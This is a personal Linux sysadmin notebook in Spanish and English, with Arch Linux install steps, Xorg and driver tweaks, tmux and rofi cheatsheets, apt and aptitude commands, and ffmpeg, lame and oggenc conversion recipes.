#############################################################################################################################################################################################

########################################################################################### sysadmin ########################################################################################

#### sysadmin #### nota #### administrador

#### notas ####

### ARCH LINUX ###

### Radeon hud to display usefull information about the workload of your game or application 

# To see option available

GALLIUM_HUD="help" glxgears

# To run a game with usefull information

GALLIUM_HUD="fps,cpu+cpu0+cpu1+cpu2+cpu3,temperature" mygame


### To check if we got dri3 enabled

cat /var/log/Xorg.1.log | grep -i dri3


### To enable dri3

sudo nano /etc/X11/xorg.conf.d/20-radeon.conf

Section "Device"
    Identifier  "Radeon"
    Driver      "radeon"
    Option      "DRI" "3"
    Option      "TearFree" "on"
    Option      "EXAVSync" "off"  - disable vsync
    Option      "SwapbuffersWait" "false"  - disable vsync
EndSection

https://wiki.archlinux.org/index.php/ATI#Performance_tuning


### Paste

curl -F c=@path/to/a/file https://ptpb.pw

curl -F c=@- https://ptpb.pw


# To interactively enter a key and see what keysym it is configured to, use:

xev | grep -A2 --line-buffered '^KeyRelease' | sed -n '/keycode /s/^.*keycode \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p'


# To get the class and instance of a windows, you can use "xprop". After clicking on the window, you will see the following output:

xprop | grep WM_CLASS

WM_CLASS(STRING) = "irssi", "URxvt"


# To reload .Xresources config file so the changes take effect without having to restart X

xrdb -load ~/.Xresources


# To see audio keycodes for your keyboard

xmodmap -pke | grep XF86Audio


# Weather in terminal

curl wttr.in


# One liner to see gmail entries

curl -u user:password --silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"

# count how many gmails do you have

curl -u user:password --silent "https://mail.google.com/mail/feed/atom" | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | wc -l


# Look for high priority errors in the systemd journal

sudo journalctl -p 0..3 -xn


# Replace colors in svg icon themes using find and xarg

find . -name "*.svg" -not -type l -print0 | xargs -0 sed -i 's/iconthemecolor/yourcolorhere/g'


# To install fonts manually system-wide, copy  files to /usr/share/fonts/local and /usr/share/kbd/consolefonts 

Then do:

sudo fc-cache -fs
sudo mkfontscale /usr/share/fonts/local
sudo mkfontdir /usr/share/fonts/local

And make sure you have something like this in your .xinitrc:

xset +fp /usr/share/fonts/local
xset +fp rehash

# Gnome uses libinput instead of evdev to configure the system settings like mouse speed etc

sudo -Syu xf86-input-libinput


# weechat trigger command to filter join part and quit messages

/trigger add testnull modifier "weechat_print" "${tg_tags} =~ irc_part|irc_join|irc_quit" "/(.*)/${tg_prefix}\t${tg_tag_prefix_nick}${tg_tag_nick}" ""


# Send e-mails using mutt

mutt -s "Subject" somejoeorjane@someserver.com < /var/log/somelog

# Send a message with attachment

mutt -s "Subject" somejoeorjane@someserver.com -a somefile < /tmp/sometext.txt


# Filter join, quit, part messages weechat

/set irc.look.smart_filter on
/filter add irc_smart * irc_smart_filter *
/filter add joinquit * irc_join,irc_part,irc_quit *


# Remove steam's runtime libraries if steam doesn't wanna work

find ~/.steam/root/ \( -name "libgcc_s.so*" -o -name "libstdc++.so*" -o -name "libxcb.so*" -o -name "libgpg-error.so*" \) -print -delete

find ~/.local/share/Steam/ \( -name "libgcc_s.so*" -o -name "libstdc++.so*" -o -name "libxcb.so*" -o -name "libgpg-error.so*" \) -print -delete


# Config file for setting up mouse DPI

/usr/lib/udev/hwdb.d/70-mouse.hwdb


# Send an email with attachment using the mutt

echo "Message Body Here" | mutt -s "Subject Here" -a backup.zip user@example.com


### Mouse dpi settings

/usr/lib/udev/hwdb.d/70-mouse.hwdb

### my arch installation guide ###

### Set the keyboard layout ###

The default keyboard layout is US. Alternative keyboard layouts can be loaded with loadkeys keymap_file: keymap files can be found in /usr/share/kbd/keymaps/ 
(path and file extension can be ommitted).


### Connect to the Internet ###

Internet service via DHCP discovery is enabled on boot for supported wired devices; read more at Network configuration. For supported wireless devices run wifi-menu to set up the network; 
read more with Wireless network configuration. If needing a static IP or network management tools, stop the DHCP discovery service with systemctl stop dhcpcd@eth0.service, and read Netctl. 

En el caso de que nuestra targeta de red este desactivada, la activamos con el siguiente comando:

ip link set up enp2s0

### Update the system clock ###

# timedatectl set-ntp true 

To check the service status, use timedatectl status:

$ timedatectl status

Local time: Thu 2015-07-09 18:21:33 CEST
Universal time: Thu 2015-07-09 16:21:33 UTC
RTC time: Thu 2015-07-09 16:21:33
Time zone: Europe/Amsterdam (CEST, +0200)
Network time on: yes
NTP synchronized: yes
RTC in local TZ: no


### Partitioning ###

cfdisk /dev/sda - DOS/MBR

/ - 15 GB
swap - 1 GB
/home - el resto


### Formating ###

lsblk


To unmount it, you can use umount on the directory where the filesystem was mounted to:

# umount /mountpoint


To create a new file system of type ext4 on a partition do:
(Warning: After creating a new filesystem, data previously stored on this partition can likely not be recovered. Make a backup of any data you want to keep.)

# mkfs.ext4 /dev/partition


Alternatively, you can use mkfs which is just a unified front-end for the different mkfs.fstype tools.

# mkfs -t ext4 /dev/partition

Creamos y activamos swap

mkswap /dev/partition

swapon /dev/partition


### Mount the partitions ###

Mount the root partition on /mnt. After that, create directories for and mount any other partitions (/mnt/boot, /mnt/home, ...) and activate your swap partition if you want them to be 
detected later by genfstab. 

mount /dev/partition /mnt  -  for root (/)

mkdir /mnt/home/

mount /dev/partition /mnt/home  -  for home


### Selecting a mirror ###

Edit /etc/pacman.d/mirrorlist and select a download mirror(s). Regional mirrors usually work best; however, other criteria may be necessary to discern, read more on Mirrors. This copy of 
the mirrorlist file will later be copied on the new system by pacstrap, so it is worth getting it right. 


### Install the base packages ###

Use the pacstrap script to install the base group:

# pacstrap /mnt base base-devel


### Configure the system ###

Generate an fstab file (use -U or -L to define by UUID or labels):

# genfstab -U -p /mnt >> /mnt/etc/fstab

# cat /mnt/etc/fstab


### Change root into the new system: ###

# arch-chroot /mnt


### Set the hostname: ###

# echo computer_name > /etc/hostname

nano /etc/hosts  -  agregamos el nombre de nuestra maquina a las direcciones de ip local ipv4 e ipv6

### Set the time zone: ###

# ln -sf /usr/share/zoneinfo/zone/subzone /etc/localtime

hwclock --systohc --utc

Uncomment the needed locales in /etc/locale.gen, then generate them with:

# locale-gen

# export LANG=en_US.UTF-8

Set locale preferences in /etc/locale.conf and possibly $HOME/.config/locale.conf:

# echo LANG=your_locale > /etc/locale.conf

# Keymap

localectl list-keymaps

localectl set-keymap --no-convert keymap


### Habilitar el servicion DHCP para que nos autoconectemos a internet cada vez que rebooteamos ###

systemctl enable dhcpcd@enp2s0.service

# gordito: sudo cp /etc/netctl/examples/ethernet-dhcp /etc/netctl/  -  editamos el archivo agregando nuestra targeta de red

sudo netctl start ethernet-dhcp

sudo netctl enable ethernet-dhcp

### Configure /etc/mkinitcpio.conf if additional features are needed. Create a new initial RAM disk with: ###

# mkinitcpio -p linux


### Set the root password: ###

# passwd


### Installing grub ###

grub-install --recheck /dev/sdx
grub-mkconfig -o /boot/grub/grub.cfg


### Post installation ###

# addin a user #

# useradd -m -G wheel -s /bin/bash curiousx

# passwd curiousx

# edito sudoers y descomento %wheel para que curiousx pueda usar sudo #

# visudo


### Install yaourt ###

sudo nano /etc/pacman.conf


### Actualizamos y sincronizamos el sistema ###

sudo pacman -Syu


### Instalamos audio ###

sudo pacman -S pulseaudio pulseaudio-alsa alsa-utils


### Instalamos xorg ###

sudo pacman -S xorg xorg-server xorg-server-utils xorg-apps xorg-xinit xorg-twm xterm  -  y elejimos nuestros drivers graficos

############################################################################################################################


# encode standarized dvd format ffmpeg #

ffmpeg -i video.VOB -target ntsc-dvd output.mpg

# Load Xresources changes on the fly #

xrdb -load ~/.Xresources

# A nice method for testing out fonts in a live terminal before committing to the config is by printing escape codes in the terminal, for example: #

printf '\e]710;%s\007' "xft:Terminus:pixelsize=12"

# newsbeuter documentation file #

/usr/share/doc/newsbeuter/newsbeuter.html

### qutebrowser ###

# see default settings #

:open qute:settings

# deshabilitar javascript #

:set content allow-javascript false

# removed historial #

/home/curiousx/.local/share/qutebrowser/local-storage/*

~/.local/share/qutebrowser/history

# to know what is the name of the package a binary belong to #

pacman -Qo /usr/bin/binary  -  pacman -Qo /usr/bin/lemonbar   # to uninstall it  -  sudo pacman -Rs <package-name>  -  sudo pacman -Rs lemonbar-git

### dircolors ###

# create the dircolor database

dircolors -p > ~/.dircolors

# to have colors in termite we edit ~/.dircolors and add 

TERM xterm-termite

# finaly we add in bashrc or zshrc #

eval $(dircolors ~/.dircolors)


# network package utilities to play with wifi connection: ifrename iwconfig iwevent iwgetid iwlist iwpriv iwspy

sudo pacman -S wireless_tools

# actualizar packages manualmente instalados descargados desde aur con makepkg #

<eviladmin> curiousx: for git/similar packages just use makepkg -ic when you rebuild them, the -c prevents build errors when you rebuild, think of it as "make clean"
<@amcrae> better off using -C  - that cleans at the start, -c cleans at the end 

# solucion librerias steam #

find ~/.steam/root/ \( -name "libgcc_s.so*" -o -name "libstdc++.so*" -o -name "libxcb.so*" \) -print -delete

find ~/.local/share/Steam/ \( -name "libgcc_s.so*" -o -name "libstdc++.so*" -o -name "libxcb.so*" \) -print -delete


# reproducir videos tty #

# agregamos un usuario ya existente en el sistema a el grupo "video" ya existente en el sistema #

usermod -aG group/s username  -  para que este comando tome efecto debemos deslogearnos y volvernos a logear

mplayer -vo fbdev2 -fs <video file>

mplayer -vo fbdev2 -fs -zoom -xy <first number of res> <video file>


paste: curl -F c=@- "https://ptpb.pw" OR "curl -F c=@path/to/a/file https://ptpb.pw"


# configurar el teclado a espaniol en tty #

localectl set-keymap es

# configurar el teclado a espaniol en xorg #

localectl set-x11-keymap es

# instalar locate #

sudo pacman -S mlocate ; sudo updatedb

# command to show mounted paritions #

findmnt

findmnt --target /tmp

Note sheep irc: curiousx: tmpfs is always allocated from ram and swap  -  curiousx: and systemd will mount a tmpfs at /tmp by default

# feh visor de imagenes liviano #

feh -g 1920x1080 -d -S filename /path/to/directory

shanemikel: curiousx, well, they have their place, just saying.. expect some weird behavior regarding scope, string manipulation is pretty decent but quoting can be a pain, start by reading 'man test', and 
then learn the ways to refer to variables like taking substrings, length, etc.. learn loops and readline, redirection and file descriptors. (lean bash scripting)



# boot into tty using systemd #

Edit /etc/default/grub with your favorite editor, eg: nano:

sudo nano /etc/default/grub


Find out this line:

GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"


Change it to:

GRUB_CMDLINE_LINUX_DEFAULT="text"


Update Grub:

sudo update-grub


This is an additional step for systemd releases, eg: Ubuntu 15.04, the steps above for grub are still necessary

You need to tell systemd to not load the graphical login manager:

sudo systemctl enable multi-user.target --force
sudo systemctl set-default multi-user.target

You will still be able to use X by typing startx after you logged in



# solucionar problemas al compilar: sudo apt-get install auto-apt build-essential checkinstall ; sudo auto-apt update && sudo auto-apt updatedb && sudo auto-apt update-local ; sudo auto-apt run ./configure", then do "make && sudo checkinstall". That helps deal with the dependency hell that comes with  building C stuff from source.


# deshabilitar aceleracion del mouse, util para jugar a los juegos

xset m 0 0

# convertir json to yamal rss (unicode safe) #

python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout, allow_unicode=True)' < foo.json > foo.yaml

# enumerar la cantidad de slots pci pcie que tenemos en la mother #

dmidecode --type 9 |egrep 'Bus Address|Designation'

# generar una imagen donde podemos ver la cantidad de CPU procesadores y uno que otro dispositivo mas #

sudo apt-get install hwloc ; lstopo -p -v --whole-system --whole-io output.svg

instalando "Unity-Greeter-Badges" podemos ver los inconos de los demas entornos de escritorios en lightdm

syslogd: registra los mensajes que los programas y el sistema ofrecen

klogd: es un demonio del sistema que intercepta y registra los mensajes del nucleo

dispositivo de bloques: aquellos que almacenan informacion en bloques de tamano fijo

dispositivo de caracteres: aquellos que envian o reciben un flujo de datos de forma

dma (acceso directo memoria): es la manera en que los dispositivos se comunican directamente con la memoria sin intervencion del procesador. cada controlador dispone de una linea o canal dma de acceso directo

irq (solicitud de interrupcion): es la manera en que el controlador de un dispositivo solicita al procesador que le atienda porque va a comunicarle algun suceso,cada controlador tiene una linea irq distinta

io ports (puertos de entrada/salida): se trata de una abstraccion (que se corresponde con un dispositivo)a traves de la cual un dispositivo intercambia datos con el sistema. tienen una direccion(en hexadecimal)que los identifica

#### tip para utilizar con el comando "cd" para volver al directorio anterior ####

cd -

#### ver los colores reconocidos por el sistema y su codigo rgb ####

showrgb

#### ver la arquitectura del sistema operativo ####

arch

#### apagar el sistema ####

init 0

#### apagar el sistema ####

halt

#### restaura la consola Util para cuando empiezan a aparecer caracteres raros ####

reset

#### con la combinacion de teclas "super+space" podemos cambiar en las configuraciones idiomas de teclado que tengamos instaladas ####

#### ejecutar comandos en un proxy ####

http_proxy=http://user:password@ip_proxy:puerto_proxy comando

#### directorio donde se encuentra el kernel que estamos usando ####

/usr/src/

#### redirect stdout and stderr to stdout and also to a file ####

command_line 2>&1 | tee -a output_file

#### crear acceso directo launcher shortcut en gnome ####

gnome-desktop-item-edit --create-new shortcut.desktop

#### crear acceso directo launcher shortcut en lxde lubuntu

lxshortcut -o ~/desktop/mylauncher

#### reproducir dvd con menu interactivos ####

/usr/share/doc/libdvdread4/install-css.sh

#### solucionar bug wallpaper ####

gsettings set org.gnome.settings-daemon.plugins.background active true

#### parametro para forzar la bios desde el grub a utilizar acpi acpi en ubuntu ####

acpi=force

#### solucion graficas nvidia ati amd al iniciar el sistema operativo dando un pantalla negra al entrar al escritorio ####

grub_cmdline_linux_default="quiet splash nomodeset"

#### remover cuenta ussuario guest ####

echo allow-guest=false | tee -a /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf

#### solucion libreria hiphop (reproductor musica) ####

ln -sf /lib/x86_64-linux-gnu/libudev.so.1 /lib/x86_64-linux-gnu/libudev.so.0

#### codigo weather clima rio gallegos ####

weather sawg

#### ejecuta el comando solo si el anterior ha devuelto cero "0" (se ha ejecutado de forma exitosa) para este caso tenemos el operador &&: ####

apt-get update && apt-get upgrade

#### si queremos controlar el caso en que el primer comando falle tenemos el operador ||: ####

apt-get update || apt-get upgrade

#### utiliza las comillas cuando trabajes con variables si utilizas variables, al asignarles valores alfanumericos, texto; deberias utilizar siempre comillas dobles (a no ser que tengas razones para no hacerlo). tambien puedes poner el nombre de la variable entre llaves para asegurarte que se ejecutan bien las llamadas. ####

#### con la combinacion de teclas "super+space" podemos cambiar en las configuraciones idiomas de teclado que tengamos instaladas ####

#### veamos una serie de ejemplos y casos diferentes, con sus respectivas salidas: ####

ls tmp/
a b

var="tmp/*"

echo $var
tmp/a tmp/b

echo "$var"
tmp/*

echo $vara

echo "$vara"

echo "${var}a"
tmp/*a

echo ${var}a
tmp/a

#### os-prober only looks for bios bios based oss when booted via bios, and only looks for uefi based oss when booted via uefi. uefi gtp mbr ####

#### para hacer un chroot desde un live cd/usb es necesario que los dos sistemas operativos sean de la misma arquitectura el live en 32 bits y el sistema operativo a reparar en 32 bits tambien luego se procede a montar la partion donde se encuentre ubuntu para despues instalar y acualizar grub en ella ####

mount /dev/sdxx /mnt

chroot /mnt

#### para instalar grub en un disco duro despues de haber hecho chroot se utiliza ####

grub-install --recheck /dev/sdx   - antes hacer chroot

#### seguido de haber instalado grub se debe actualizarlo para que reconosca la paration donde se encuentra windows en el caso de que windows tambien este instalado en la pc en cuestion ####

update-grub

#### crear un directorio y cambiarse a el en una linea de comando ####

mkdir /home/foo/doc/bar && cd $_

#### como hacer un archivo backup con el ano mes fecha hora minuto segundo ####

filename-`date +%f-%t`.bak

#### mostrar consumo - conecciones a internet graficamente ####

nethogs eth0

#### bajar contraste monitor ####

setpci -s 00:02.0 f4.b=9a

setpci -s 00:02.0 f4.b=55  aun mas bajo

#### ocultar archivos en samba, para ocultar archivos en samba se tiene que editar el archivo de confirugacion /etc/samba/smb.conf agregando las sigientes lineas: ####

veto files = /*.mp3/*.doc etcetera...

#### comando para suspender linux ####

pm-suspend

#### carpeta donde podemos ver las estadisticas de la red cableada ####

/sys/class/net/eth0/statistics/

#### deshabilitar apagar selinux ####

setenforce 0

#### actualizar version distro ubuntu ####

do-release-upgrade -d

#### carpeta donde se encuentran las claves llaves gpg de los repositorios oficial y ppas ppas desde donde descargo los programas ####

ls /var/lib/apt/lists/   - si removemos todo su conenido podriamos solucionar problemas con claves llaves gpg luego de un: apt-get update, eso regeneraria todas las llaves claves gpg nuevamente 

ls /var/lib/apt/lists/partial/   - si removemos todo su conenido podriamos solucionar problemas con claves llaves gpg luego de un: apt-get update, eso regeneraria todas las llaves claves gpg nuevamente

#### comprobar si un archivo es un hard link o un symbolic link con stat ####

if [ "$(stat -c %h -- "$file")" -gt 1 ]; then
    echo "file has more than one name"
fi

the -c '%h' bit tells stat to just OUTPUT the number of hardlinks to the inode, i.e., the number of names the file has. -gt 1 then checks if that is more than 1

#### ejecuta un comando cada x segundos (2 por defecto) y observar su salida en tiempo real ####

watch -n tiempo comando

#### visualiza el nombre de la maquina. ####

hostname

#### muestra la terminal que estamos usando a la salida estandar. ####

tty

#### mostrar consumo - conecciones a internet graficamente ####

nethogs eth0

#### teminal para comunicarnos con el puerto serial ####

aptitude show gtkterm

#### solucionar: "Error "406 Not Acceptable" al actualizar los índices de los repositorios" ppa ####

rm -f /var/lib/apt/lists/partial/*

#### solucion: "Gtk-WARNING **: Imposible encontrar el motor de temas en la ruta al _modulo: «murrine»" ####

sudo apt-get install gtk2-engines-murrine

#### solucion: init: "plymouth-upstart-bridge main process ended, respawning" ####

in file /etc/defaults/grub   - set line:   GRUB_CMDLINE_LINUX_DEFAULT="noplymouth"    and run: sudo update-grub

#### periso denegado cuando redireccionamos (>) con sudo ####

sudo ls -hal /root/ > /root/test.out   - solucion -   sudo sh -c 'ls -hal /root/ > /root/test.out'   - agregamos:  sh -c   asi llamamos a una shell root para que ejecute el comando 

#### screen locker en ubuntu unity ####

light-locker

#### cuando compilamos una libreria lo mas probable es que el sistema no pueda cargar la o no la encuentre al ejecutar la aplicion que utiliza esa libreria para eso tenemos que hacer: ####

ldconfig

#### cambiar shell por defecto a zsh ####

chsh -s /bin/zsh

#### ver la configuracion de gnome en texto plano ####

dconf dump / > everything.conf

#### solucion LC_ALL = (unset) simbolos raros inlegibles no leibles ####

echo LC_ALL="en_US.utf8" >> /etc/environment

echo LC_ALL="en_GB.utf8" >> /etc/environment


#############################################################################################################################################################################################

############################################################################################ startx #########################################################################################

#### startx

#### iniciar el entorno grafico con el gestor especificado en el .initrc de tu home. ####

startx

#### arranca el entorno grafico con el icewm (si es que no fuera el predeterminado) ####

startx /usr/bin/X11/gnome-shell


################################################################################### tmux #############################################################################

tmux shortcuts & cheatsheet
start new:

tmux
start new with session name:

tmux new -s myname
attach:

tmux a  #  (or at, or attach)
attach to named:

tmux a -t myname
list sessions:

tmux ls
kill session:

tmux kill-session -t myname
Kill all the tmux sessions:

tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill
In tmux, hit the prefix ctrl+b (my modified prefix is ctrl+a) and then:

# Sessions

:new<CR>  new session
s  list sessions
$  name session
Windows (tabs)

c  create window
w  list windows
n  next window
p  previous window
f  find window
,  name window
&  kill window
Panes (splits)

%  vertical split
"  horizontal split

o  swap panes
q  show pane numbers
x  kill pane
+  break pane into window (e.g. to select text by mouse to copy)
-  restore pane from window
⍽  space - toggle between layouts
<prefix> q (Show pane numbers, when the numbers show up type the key to goto that pane)
<prefix> { (Move the current pane left)
<prefix> } (Move the current pane right)
<prefix> z toggle pane zoom
Sync Panes

You can do this by switching to the appropriate window, typing your Tmux prefix (commonly Ctrl-B or Ctrl-A) and then a colon to bring up a Tmux command line, and 
typing:

:setw synchronize-panes
You can optionally add on or off to specify which state you want; otherwise the option is simply toggled. This option is specific to one window, so it won’t change 
the way your other sessions or windows operate. When you’re done, toggle it off again by repeating the command. tip source

# Resizing Panes

You can also resize panes if you don’t like the layout defaults. I personally rarely need to do this, though it’s handy to know how. Here is the basic syntax to 
resize panes:

PREFIX : resize-pane -D (Resizes the current pane down)
PREFIX : resize-pane -U (Resizes the current pane upward)
PREFIX : resize-pane -L (Resizes the current pane left)
PREFIX : resize-pane -R (Resizes the current pane right)
PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells)
PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells)
PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells)
PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells)
PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells)
PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)

# Copy mode:

Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our 
configuration file to use Vim keys for moving between windows and resizing panes so we wouldn’t have to take our hands off the home row. tmux has a vi mode for 
working with the buffer as well. To enable it, add this line to .tmux.conf:

setw -g mode-keys vi
With this option set, we can use h, j, k, and l to move around our buffer.

To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn’t very efficient. Since we enabled vi mode, we can also use some 
other visible shortcuts to move around the buffer.

For example, we can use "w" to jump to the next word and "b" to jump back one word. And we can use "f", followed by any character, to jump to that character on the 
same line, and "F" to jump backwards on the line.

   Function                vi             emacs
   Back to indentation     ^              M-m
   Clear selection         Escape         C-g
   Copy selection          Enter          M-w
   Cursor down             j              Down
   Cursor left             h              Left
   Cursor right            l              Right
   Cursor to bottom line   L
   Cursor to middle line   M              M-r
   Cursor to top line      H              M-R
   Cursor up               k              Up
   Delete entire line      d              C-u
   Delete to end of line   D              C-k
   End of line             $              C-e
   Goto line               :              g
   Half page down          C-d            M-Down
   Half page up            C-u            M-Up
   Next page               C-f            Page down
   Next word               w              M-f
   Paste buffer            p              C-y
   Previous page           C-b            Page up
   Previous word           b              M-b
   Quit mode               q              Escape
   Scroll down             C-Down or J    C-Down
   Scroll up               C-Up or K      C-Up
   Search again            n              n
   Search backward         ?              C-r
   Search forward          /              C-s
   Start of line           0              C-a
   Start selection         Space          C-Space
   Transpose chars                        C-t

# Misc

d  detach
t  big clock
?  list shortcuts
:  prompt
Configurations Options:

# Mouse support - set to on if you want to use the mouse
* setw -g mode-mouse off
* set -g mouse-select-pane off
* set -g mouse-resize-pane off
* set -g mouse-select-window off

# Set the default terminal mode to 256color mode
set -g default-terminal "screen-256color"

# enable activity alerts
setw -g monitor-activity on
set -g visual-activity on

# Center the window list
set -g status-justify centre

# Maximize and restore a pane
unbind Up bind Up new-window -d -n tmp \; swap-pane -s tmp.1 \; select-window -t tmp
unbind Down
bind Down last-window \; swap-pane -s tmp.1 \; kill-window -t tmp


####################################################################################### rofi #########################################################################

# rofi xresources configuration options

rofi -dump-xresources


# rofi kay binding

Ctrl-v, Insert	                Paste clipboard

Ctrl-Shift-v, Shift-Insert	Paste primary selection

Ctrl-u	                        Clear the line

Ctrl-a	                        Beginning of line

Ctrl-e	                        End of line

Ctrl-f, Right	                Forward one character

Alt-f	                        Forward one word

Ctrl-b, Left	                Back one character

Alt-b	                        Back one word

Ctrl-d, Delete	                Delete character

Ctrl-Alt-d	                Delete word

Ctrl-h, Backspace	        Backspace (delete previous character)

Ctrl-Alt-h	                Delete previous word

Ctrl-j,Ctrl-m,Enter	        Accept entry

Ctrl-n,Down	                Select next entry

Ctrl-p,Up	                Select previous entry

Page Up	                        Go to the previous page

Page Down	                Go to the next page

Ctrl-Page Up	                Go to the previous column

Ctrl-Page Down	                Go to the next column

Ctrl-Enter	                Use entered text as command (in ssh/run modi)

Shift-Enter	                Launch the application in a terminal (in run mode)

Shift-Enter	                Return the selected entry and move to the next item while keeping Rofi open. (in dmenu)

Shift-Right	                Switch to the next modi. The list can be customized with the -switchers argument.

Shift-Left	                Switch to the previous modi. The list can be customized with the -switchers argument.

Ctrl-Tab	                Switch to the next modi. The list can be customized with the -switchers argument.

Ctrl-Shift-Tab	                Switch to the previous modi. The list can be customized with the -switchers argument.

Ctrl-space	                Set selected item as input text.

Shift-Del	                Delete entry from history.

Ctrl-grave	                Toggle case sensitivity.


#############################################################################################################################################################################################

############################################################################################ finger #########################################################################################

#### finger

#### finger muestra los usuarios conectados en tiempo real al sistema. necesita instalarse como paquete aparte (finger) ####

#### informacion sobre un usuario conectado al sistema ####

finger usuario

#### informa sobre todos los usuarios conectados a un servidor (nombre o ip) ####

finger servidor/ip

#### informa sobre un usuario conectado a un servidor ####

finger usuario@servidor



#############################################################################################################################################################################################

############################################################################################# chat ##########################################################################################

#### talk #### write

#### talk noes puede servir para entablar una conversacion con un usuario del sistema via chat ####

talk usuario

#### entabla conversacion con un usuario de otro sistema(entre maquinas unix) ####

talk usuario@sistema

#### manda un mensaje a un usuario del sistema ####

write usuario



#### nota: "mesg -n" anula la notificacion de comunicacion de talk o write ####

#### nota: "mesg -y" habilita la llegada de notificaciones de talk o write ####

#############################################################################################################################################################################################

############################################################################################# last ##########################################################################################

#### last #### lastb

#### last muestra los ultimos usuarios que se conectaron y desconectaron en el sistema y las fechas y horas de conexion (Util para analizar intrusiones) (archivo /var/log/wtmp) ####

#### muestra los intentos de conexion fallidos (archivo /var/log/btmp) ####

lastb


#############################################################################################################################################################################################

######################################################################################## tzconfig tzselect ##################################################################################

#### tzconfig #### tzselect

#### tzconfig y tzselect son programas interactivos que permiten selecionar la zona horaria. ####



#############################################################################################################################################################################################

############################################################################################## apt ##########################################################################################

#### apt

#### si en los repositorios tenemos mas de una version de un programa o una libreria en particular podriamos instala esa version que queremos en particular de la siguiente manera ####

apt-get install libboost-all-dev=1.48.0.2   - agregando el simbolo "=" seguido de la version del programa libreria que querramos instalar

#### apt-cache policy es util para saber si un programa ha sido instalado desde los repositorios oficiales de ubuntu o si ha sido instalado desde algun ppa ppa ####

apt-cache policy programa

#### mostrar nombre de paquetes que apt conoce ####

apt-cache pkgnames program   - apt-cache pkgnames linux-

#### instalar driver targeta inalambrica broadcom ####

sudo apt-get install firmware-b43-installer

sudo apt-get remove --purge bcmwl-kernel-source b43-fwcutter firmware-b43-installer && sudo apt-get update && sudo apt-get install linux-firmware-nonfree ; sleep 2 ; sudo modprobe b43

#### solucion problema icono de red en xfce ####

apt-get install network-manager-gnome -y

#### para ver a cuantos fps esta corriendo nuestra placa grafica o para verificar que esta tiene soporte 3d ####

apt-get install mesa-utils ; glxgear

#### mesa-vdpau-drivers ver videos con aceleracion por hardware ####

apt-get install mesa-vdpau-drivers

#### solucion copiar pegar xterm  para solucionar este problema tenemos que instalar este programa ####

apt-get install parcellite



#############################################################################################################################################################################################

########################################################################################### aptitude ########################################################################################

#### aptitude

#### actualiza la lista de paquetes ####

aptitude update

#### actualiza el sistema (no instala ni elimina paquetes) ####

aptitude upgrade

#### actualiza el sistema eliminando e instalando paquetes si fuera necesario####

aptitude dist-upgrade

#### instala los paquetes indicados ####

aptitude install [paquetes]

#### reinstala los paquetes indicados ####

aptitude reinstall [paquetes]

#### elimina los paquetes indicados ####

aptitude remove [paquetes]

#### elimina los paquetes y sus archivos de configuracion ####

aptitude purge [paquetes]

#### descarga los paquetes en el directorio actual ####

aptitude download [paquetes]

#### bloqua los paquetes indicados ####

aptitude hold [paquetes]

#### desbloquea los paquetes seleccionados ####

aptitude unhold [paquetes]

#### desmarca paquetes como instalados manualmente ####

aptitude unmarkauto [paquetes]

#### marca paquetes como instalados manualmente ####

markauto

#### busca un paquete por nombre o expresion ####

aptitude search [expresion]

#### muestra informacion detallada de un paquete ####

aptitude show [paquete]

#### elimina los paquetes .deb descargados ####

aptitude clean



#############################################################################################################################################################################################

############################################################################################# lame ##########################################################################################

#### lame

#### pasar de wav a mp3 (-b bitrate -h mayor calidad; -m j join stereo) ####

lame -h -m j tema.wav

#### pasar lote de wav a mp3 ####

lame -h -m j --nogap *.wav

#### pasar de mp3 a wav ####

lame -h --decode tema.mp3 tema.wav

#### mejorar la calidad de archivos .mp3 aumentando el bitrate y el sample rate con lame ####

lame -v 0 -q 0 -b 320 -m s --resample 44.1 <archivo de entrada> <archivo salida>



nota: las conversiones entre formatos comprimidos las he descartado pues hay una perdida notoria de calidad

#############################################################################################################################################################################################

######################################################################################### vorbis-tools ######################################################################################

#### oggenc #### oggdec

oggenc -b 128 -q 5 tema.wav   (-b bitrate ;-q calidad (valores entre 0 y 10)

oggenc *.wav                  (convierte todos los wav en un solo archivo ogg)

oggenc -a -l -t *.wav         (convierte todos los wav en sus respectivos ogg)

#### convertir ogg a mp3 ####

oggdec -b 16 entrada.ogg salida.wav



nota: las conversiones entre formatos comprimidos las he descartado pues hay una perdida notoria de calidad

#############################################################################################################################################################################################

########################################################################################### ffmpeg ##########################################################################################

#### ffmpeg

#### extraer audio desde archivos de video ####

ffmpeg -i entrada.avi -vn -ar 48000 -ac 2 -ab 320k -f mp3 salida.mp3

ffmpeg -i entrada.avi -ac 2 -ab 2621440 -f mp3 salida.mp3

#### convertir archivos de video para usarlos con cinelerra ffmpeg ####

ffmpeg -i entrada.avi -target ntsc-dvd salida.mpeg

ffmpeg -i entrada.avi -target pal-vcd salida.mpeg

#### grabar el escritorio con ffmpeg ####

ffmpeg -f alsa -ac 2 -i pulse -f x11grab -r 30 -s 1920x1080 -i :0.0 -acodec pcm_s16le -vcodec libx264 -vpre lossless_ultrafast -threads 0 -y video.mkv

ffmpeg -f alsa -ac 2 -i pulse -f x11grab -r 30 -s 1280x800 -i :0.0 -acodec pcm_s16le -vcodec libx264 -preset ultrafast -crf 0 -threads 0 output.mkv



#############################################################################################################################################################################################

######################################################################################### ffmpeg2theora #####################################################################################

#### ffmpeg2theora

#### convertir a formatos de video a ogg theora usando ffmpeg2theora ####

#### ffmpeg2theora es un front-end para ffmpeg, que nos permitira convertir varios archivos de video al formato de video abierto theora. he aqui un ejemplo: ####

